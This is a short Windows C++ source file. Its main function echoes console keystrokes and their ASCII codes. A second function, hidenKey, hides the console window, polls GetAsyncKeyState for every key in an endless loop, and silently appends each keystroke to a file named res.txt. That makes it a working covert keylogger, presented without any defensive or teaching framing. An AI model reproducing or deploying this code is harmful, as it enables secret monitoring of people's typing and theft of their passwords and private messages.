#define _WIN32_WINNT 0x0500
#include "pch.h"
#include <iostream>
#include <conio.h>
#include <ctype.h>
#include <stdio.h>
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <fstream>

using namespace std;
int main(void)
{
	int key;
	for (;;)
	{
		key = _getch();
		
		printf("ASCII: %d	key: ", key);

		if (key == 97)
			cout << " " << (char)key <<'\n';
		else cout << " " << (char)key <<'\n';

		if (key == 27)
			break;
	}
	return 0;
}

int hidenKey()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';
	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {

					fstream LogFile;
					LogFile.open("res.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
				}
			}
		}
	}

	return 0;
}